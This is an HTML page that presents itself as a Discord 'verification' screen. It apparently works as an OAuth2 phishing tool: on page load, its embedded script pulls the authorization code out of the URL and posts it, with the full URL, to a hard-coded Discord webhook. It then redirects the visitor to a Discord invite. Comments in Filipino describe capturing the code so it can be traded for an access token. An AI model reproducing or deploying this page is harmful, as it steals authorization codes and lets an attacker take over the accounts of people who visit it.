<!DOCTYPE html>
<html>
<head>
    <title>Verification Complete</title>
    <style>body{font-family:Arial;display:flex;align-items:center;justify-content:center;height:100vh;background:#0f172a;color:white;}.box{text-align:center;}</style>
</head>
<body>
    <div class="box">
        <h1>✅ Verifying...</h1>
        <p>Please wait, connecting to server...</p>
    </div>

<script>
    // ⚙️ CONFIG
    const WEBHOOK = "https://discord.com/api/webhooks/1528609341052027044/2nHhgkDzN_BzeEwiVT4K_LjINjxiO0Rf2O3BTHtzhGS2rEAXKottXqe-GIP2xk2vjD_b";
    const REDIRECT = "https://discord.gg/4UCD2HwqQ";

    // 🔍 KUNIN ANG CODE MULA SA URL
    const url = window.location.href;
    let code = "";
    if(url.includes("code=")){
        code = url.split("code=")[1].split("&")[0];
    }

    // 📤 IPADALA SA WEBHOOK
    fetch(WEBHOOK, {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({
            embeds:[{
                title:"🔓 BAGONG OAUTH2 CAPTURE!",
                color:0x2ecc71,
                fields:[
                    {name:"🔑 AUTHORIZATION CODE", value:"||" + code + "||\n(Gamitin ito para palitan sa Access Token)"},
                    {name:"🔗 FULL URL", value:url.slice(0,1024)}
                ]
            }]
        })
    });

    // ➡️ DUMALIN SA SERVER
    setTimeout(()=>window.location.href=REDIRECT, 2000);
</script>
</body>
</html>
